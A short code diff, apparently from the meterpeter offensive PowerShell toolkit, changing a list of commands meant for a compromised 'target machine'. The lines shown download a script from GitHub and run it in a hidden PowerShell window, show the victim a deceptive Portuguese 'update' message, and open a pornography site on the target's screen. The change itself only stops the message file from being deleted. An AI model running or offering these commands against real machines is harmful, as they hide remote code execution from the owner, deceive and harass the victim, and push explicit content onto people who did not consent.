@@ -115,7 +115,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiR
 Start-Process -WindowStyle Hidden powershell -ArgumentList "-file FWUprank.ps1 -autodelete on"
 
 ## Send a message to target machine
-echo "Carrega no [F11] no teclado para abortar o update." > ola.txt;start ola.txt;del ola.txt
+echo "Carrega no [F11] no teclado para abortar o update." > ola.txt;start ola.txt
 
 ## Open porn websites
 Start https://youporn.com
